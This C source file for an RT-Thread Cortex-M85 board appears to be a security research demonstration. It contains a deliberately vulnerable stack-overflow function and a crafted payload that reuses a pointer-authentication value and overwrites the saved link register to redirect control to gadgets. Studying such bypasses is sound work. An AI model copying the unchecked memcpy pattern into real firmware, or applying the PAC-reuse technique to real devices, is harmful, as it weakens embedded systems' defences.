/*
 * Copyright (c) 2006-2025
 *
 * SPDX-License-Identifier: Apache-2.0
 *
 * Change Logs:
 * Date           Author            Notes
 * 2025-11-02     Tianchi YU        Reuse attack demonstration
 */

#include <rtthread.h>
#include <rtdevice.h>
#include "hal_data.h"
#include <stdint.h>
#include <string.h>

#define LED_PIN BSP_IO_PORT_01_PIN_02

/* ========== Gadgets ========== */

static volatile uint32_t g_privileged_flag = 2;

__attribute__((noinline))
static void gadget_set_flag(uint32_t flag) {
    g_privileged_flag = flag;
}

/**
 * @brief Gadget 1: turn on light
 * 
 */
__attribute__((noinline))
static void turn_on_light(void)
{
    rt_pin_write(LED_PIN, PIN_LOW);
	  gadget_set_flag(2);  // not attack relevant, only to make sure this is not a leaf function
	  rt_kprintf("[ACK] Light should be on! \n\n");
}
/**
 * @brief Gadget 2: turn off light
 * 
 */
__attribute__((noinline))
static void turn_off_light(void)
{
    rt_pin_write(LED_PIN, PIN_HIGH);
	  gadget_set_flag(1);  //
	  rt_kprintf("[ACK] Light should be off! \n\n");
}

/**
 * @brief Gadget 3: light control
 * 
 */
__attribute__((noinline, optimize("O1")))
static void light_control(){
    if (g_privileged_flag == 1) {
		    rt_kprintf("[Branch 1] Turn on the light\n");
			  turn_on_light();
		} else if (g_privileged_flag == 2) {
		    rt_kprintf("[Brnch 2] Turn off the light\n");
			  turn_off_light();
		}
}

/* ========== Vulnerable Function ========== */

/**
 * @brief Vulnerable function with stack buffer overflow
 * 
 */
__attribute__((noinline, optimize("O1")))
static void vulnerable_function(const char *input, size_t len)
{
    char buffer[16];
    
    rt_kprintf("\n[VULN] Executing memcpy (%d bytes)...\n", len);
    rt_kprintf("[VULN] Buffer at: 0x%08X\n", (uint32_t)buffer);
    
    // Execute overflow copy
    memcpy(buffer, input, len);
    
    rt_kprintf("[VULN] Overflow complete, returning...\n\n");
}

/* ========== Attack Demonstration Functions ========== */

/**
 * @brief Demonstrate normal execution (no attack)
 */
static void demo_normal_execution(void)
{
    rt_kprintf("\n=== DEMO 1: Normal Execution ===\n");
	  light_control();
    const char *safe_input = "Hello";
    vulnerable_function(safe_input, 6);
    
    rt_kprintf("[RESULT] Privileged flag: 0x%08X \n\n", g_privileged_flag);
}

/**
 * @brief Demonstrate Reuse PAC value attack
 */
static void demo_attack(void)
{
    rt_kprintf("\n=== DEMO 2: Reuse PAC Attack ===\n");
    light_control();
    // Get gadget addresses and ensure Thumb bit is set
    uint32_t addr1 = (uint32_t)turn_on_light | 0x1;
    uint32_t addr2 = (uint32_t)turn_off_light | 0x1;
		
		rt_kprintf("\n[ATTACK] branches:\n");
    rt_kprintf("  [0] turn_on_light:       0x%08X\n", addr1);
    rt_kprintf("  [1] turn_off_light:  0x%08X\n", addr2);
	
    char malicious_input[64];
    int offset = 16;  // 16 (buffer)
    
    memset(malicious_input, 0, sizeof(malicious_input));
    memset(malicious_input, 'A', offset);
	  // Fake R12 to bypass AUT
  	uint32_t r12_value = 0xE22A66EB; // example 1: back to normal exeuction stack
	  //uint32_t r12_value = 0x4495ECBD; // example 2: itself stack
	
	  memcpy(malicious_input + offset, &r12_value, sizeof(r12_value));
	  offset += sizeof(r12_value);  // 20
	  // Fulfill r4-r6
	  memset(malicious_input + offset, 'A', 12);  // r4 - r6
	  offset += 12;  // 32
		uint32_t lr_value = 0x02003773; // example 1: back to normal exeuction stack
		//uint32_t lr_value = 0x020037A5; // example 2: itself stack
	  memcpy(malicious_input + offset, &lr_value, sizeof(lr_value));
    vulnerable_function(malicious_input, 36);
    
    rt_kprintf("[RESULT] Privileged flag: 0x%08X \n\n", g_privileged_flag);
}


/* ========== Main Entry ========== */

void hal_entry(void)
{
    rt_kprintf("\n");
    rt_kprintf("================================================================\n");
    rt_kprintf("      ARM Cortex-M85 Reuse PAC value Attack Demonstration\n");
    rt_kprintf("          PAC/BTI Security Features\n");
    rt_kprintf("================================================================\n");
    
    demo_normal_execution();    // Show normal behavior
	  rt_thread_mdelay(1000);
	  demo_attack();
}

